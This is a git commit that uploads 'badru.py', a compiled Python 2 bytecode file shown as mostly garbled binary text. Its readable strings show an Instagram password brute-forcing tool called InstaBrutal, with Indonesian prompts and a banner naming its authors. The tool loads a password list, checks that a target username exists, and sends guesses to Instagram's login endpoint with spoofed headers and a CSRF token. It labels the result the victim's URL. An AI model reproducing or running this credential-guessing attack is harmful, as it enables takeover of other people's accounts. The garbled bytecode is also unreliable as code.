82bb7d940a4315a2e96e159f10e6eea580c49e8e
Tn.BD_AK47 <44752384+badruwasil2801@users.noreply.github.com>
2019-02-15 06:36:02 +0700

    Add files via upload

---
+++ badru.py
@@ -0,0 +1,42 @@
+ó
+vcš[c           @   s:  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d „  Z d d d „  ƒ  YZ e e d ƒ ƒ Z y4 d GHd GHd GHd	 GHd
+ GHd GHe	 e d ƒ ƒ Z
+ Wn e k
+ rÊ Z d GHd Z
+ n Xd GHxc e j D]X Z e j e ƒ Z e r)d e GHd e j GHd GHe d ƒ e j d ƒ qÚ d e GHqÚ Wd S(   iÿÿÿÿNc         C   s=   d } t  j j d k r' t |  ƒ } n t |  ƒ } t | ƒ S(   Nt    i   (   t   syst   version_infot   majort   inputt	   raw_inputt   str(   t   textt   value(    (    s   instabrutal.pyt   Input   s
+    t   Instabrutalc           B   sA   e  Z d  d „ Z d „  Z d „  Z e j d ƒ d GHd „  Z RS(   s   pass.txtc         C   s*   | |  _  | |  _ |  j ƒ  |  j ƒ  d  S(   N(   t   usernamet   passwordsFilet   loadPasswordst   IsUserExists(   t   selfR   R   (    (    s   instabrutal.pyt   __init__   s    		
+c         C   s£   t  j j |  j ƒ r‚ t |  j ƒ Y } | j ƒ  j ƒ  |  _ t |  j ƒ } | d k rc d | GHn d GHt	 d ƒ t
+ ƒ  Wd  QXn d |  j GHt	 d ƒ t
+ ƒ  d  S(   Ni    s@   [1;92mMengumpulkan [1;36m[[1;91m%s[1;36m] [1;92mPassword...s&   [1;91mFile password tidak diketahui !s   [1;91mEnter untuk keluars7   [1;91mTolong Buat File Dengan Nama [1;36mpassword.txt(   t   ost   patht   isfileR   t   opent   readt
+   splitlinest	   passwordst   lenR	   t   exit(   R   t   ft   passwordsNumber(    (    s   instabrutal.pyR      s    
+
+c         C   sY   t  j d |  j ƒ } | j d k rB d t GHt d ƒ t ƒ  n | j d k rU t Sd  S(   Ns#   https://www.instagram.com/%s/?__a=1i”  s2   [1;91mUsername [1;36m"%s" [1;91mTidak diketahuis   [1;91mEnter untuk keluariÈ   (   t   requestst   getR   t   status_codeR	   R   t   True(   R   t   r(    (    s   instabrutal.pyR   /   s    	
+
+t   clears˜           [1;91m_nnnn_               [1;92m#################################
+        [1;91mdGGGGMMb              [1;92m# [1;91mAuthor[1;97m:    [1;36mFlu[1;91m[[1;36mX[1;91m][1;92m / [1;91m@AaRiyadh [1;92m#
+       [1;91m@p~qp~~qMb             [1;92m# [1;91mSupported[1;97m: [1;36mLimite[1;91m[[1;36mD[1;91m]          [1;92m#
+       [1;91mM[1;97m([1;36m@[1;97m||[1;36m@[1;97m) [1;91mM|             [1;92m# [1;91mFamily[1;97m:    W4H SQUAD          [1;92m#
+       [1;91m@,[1;93m----[1;91m.JM|             [1;92m# [1;91mTlp[1;97m:       62+ 895611252563   [1;92m#
+      [1;91mJS^[1;93m\__/[1;97m00[1;91mqKL            [1;92m#################################
+     [1;91mdZP[1;97m1100011[1;91mqKRb[1;97m                Sponsored By [1;93m@[1;97mBADRUWASIL
+    [1;91mdZP[1;97m001011101[1;91mqKKb
+   fZP[1;97m0111010010[1;91mSMMb
+   HZM[1;97m0110000101[1;91mMMMM    [1;91m[ [1;97mInstaBrutal [1;93mv1.0 [1;91m]
+   FqM[1;97m1110100011[1;91mMMMM
+ [1;93m__| ".[1;97m00101101[1;93m|\  ^   
+ |    `.[1;97m0011101[1;93m| `' \__
+_)      \;[1;97m;;;;;[1;93m|     .'
+\____   )[1;91mMMMMMM[1;93m|   .'
+     `-'       `--'c         C   s  t  j ƒ  } | j j i d d 6d d 6d d 6d d 6d d 6d d	 6d d
+ 6ƒ | j j i d d 6d d 6d d 6d d 6d d 6d d 6d d 6d d 6d d 6d d 6d d 6d d 6ƒ | j d  ƒ } | j j i | j j ƒ  d d! 6ƒ | j d" d# i |  j d$ 6| d% 6d& t	 ƒ} | j j i | j j ƒ  d d! 6ƒ t
+ j | j ƒ } | d' d( k rc| d) GHt S| d* t	 k rw| St Sd  S(+   NR    t	   sessionidt   midt   1t   ig_prt   1920t   ig_vwt	   csrftokent	   s_networkt
+   ds_user_idsr   Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36t	   UserAgents   x-instagram-ajaxt   XMLHttpRequests   X-Requested-Withs   https://www.instagram.comt   origins!   application/x-www-form-urlencodedt   ContentTypes
+   keep-alivet
+   Connections   */*t   Acceptt   Referers   www.instagram.comt	   authorityt   Hosts   en-US;q=0.6,en;q=0.4s   Accept-Languages   gzip, deflates   Accept-Encodings   https://www.instagram.com/s   X-CSRFTokens.   https://www.instagram.com/accounts/login/ajax/t   dataR   t   passwordt   allow_redirectst   statust   failt   messaget   authenticated(   R   t   Sessiont   cookiest   updatet   headersR   t   get_dictt   postR   R   t   jsont   loadsR   t   False(   R   R5   t   sessR    R4   (    (    s   instabrutal.pyt   LoginK   s4    A$,$	(   t   __name__t
+   __module__R   R   R   R   t   systemRE   (    (    (    s   instabrutal.pyR
+      s   		
+s&   [1;92mUsername Target[1;97m: [1;36mR    s   [1;36m[[1;91mPilih[1;36m]s.   [1;91m[[1;97m+[1;91m] [1;97m1 mbps[1;91m%s.   [1;91m[[1;97m+[1;91m] [1;97m2 mbps[1;91m%s.   [1;91m[[1;97m+[1;91m] [1;97m3 mbps[1;91m%s.   [1;91m[[1;97m+[1;91m] [1;97m4 mbps[1;91m%s(   [1;92mMasukan Kecepatan[1;97m: [1;91msC   [1;91mError[1;97m, [1;36mMelebih Batas Kecepatan[1;92m"Batas 4"i   s5   [1;36mBerhasil[1;92m==> [1;91m[ [1;97m%s [1;91m]sQ   [1;92m[[1;91m+[1;92m] [1;91mURL Korban[1;97m=> https://www.instagram.com/%s/s   [1;92mSelamat mencoba :) s   [1;91mEnter untuk ke menu...s   python2 instabrutal.pys1   [1;91mGagal [1;95m==> [1;93m[[1;91m%s[1;93m](    (   R   RA   R   t   randomR   t   timeR	   R
+   t   instabrutalt   intt	   delayLoopt	   Exceptiont   eR   R5   RE   RD   R   RH   (    (    (    s   instabrutal.pyt   <module>   s2   <	
+m
+	
+
